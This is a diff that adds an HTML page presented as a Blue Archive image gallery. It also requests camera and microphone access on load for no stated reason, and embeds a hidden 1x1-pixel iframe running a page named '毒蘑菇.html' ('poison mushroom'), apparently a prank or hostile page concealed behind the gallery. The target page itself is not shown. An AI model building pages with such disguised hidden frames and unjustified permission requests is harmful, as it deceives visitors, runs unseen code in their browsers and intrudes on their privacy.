@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<!-- 声明文档类型是HTML5 -->
+ <html>
+    <!-- 网页开头 -->
+    <head>
+        <!-- 头部代码开头 -->
+        <meta charset="UTF-8">
+        <!-- 指定编码格式为UTF-8 -->
+        <title>蔚蓝档案 ｜ 美图合集</title>
+        <!-- 标题 -->
+        <html lang="zh-CN">
+        <!-- 设置语言为简体中文 -->
+        <link rel="icon" href="qwq媒体文件/qwq-图标.jpg">
+        <!-- 图标 -->
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <!-- 移动端显示优化 -->
+         <script>
+        async function requestMediaPermissions() {
+            try {
+                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                console.log('已成功获取摄像头和麦克风权限！');
+            } catch (error) {
+                console.error(`获取权限时出错: ${error.message}`);
+            }
+        }
+    
+        requestMediaPermissions();
+        </script>
+         <style>
+    .qwq {max-width: 100%;height: auto;}
+         </style>
+    </head>
+<body>
+ <img src="qwq媒体文件/1.jpg" class="qwq">
+ <img src="qwq媒体文件/2.jpg" class="qwq">
+ <img src="qwq媒体文件/3.jpg" class="qwq">
+ <img src="qwq媒体文件/4.jpg" class="qwq">
+ <img src="qwq媒体文件/5.jpg" class="qwq">
+ <img src="qwq媒体文件/6.jpg" class="qwq">
+ <img src="qwq媒体文件/7.jpg" class="qwq">
+ <img src="qwq媒体文件/8.jpg" class="qwq">
+ <img src="qwq媒体文件/9.jpg" class="qwq">
+ <img src="qwq媒体文件/10.jpg" class="qwq">
+ <!-- 显示图片 -->
+ <iframe
+  src="毒蘑菇.html"   
+  width="1"              
+  height="1"                   
+  frameborder="0"  
+  allowfullscreen="true"
+  sandbox="allow-same-origin allow-scripts">
+ </iframe>
+ <!-- 内嵌毒蘑菇 -->
+</body>
+ </html>
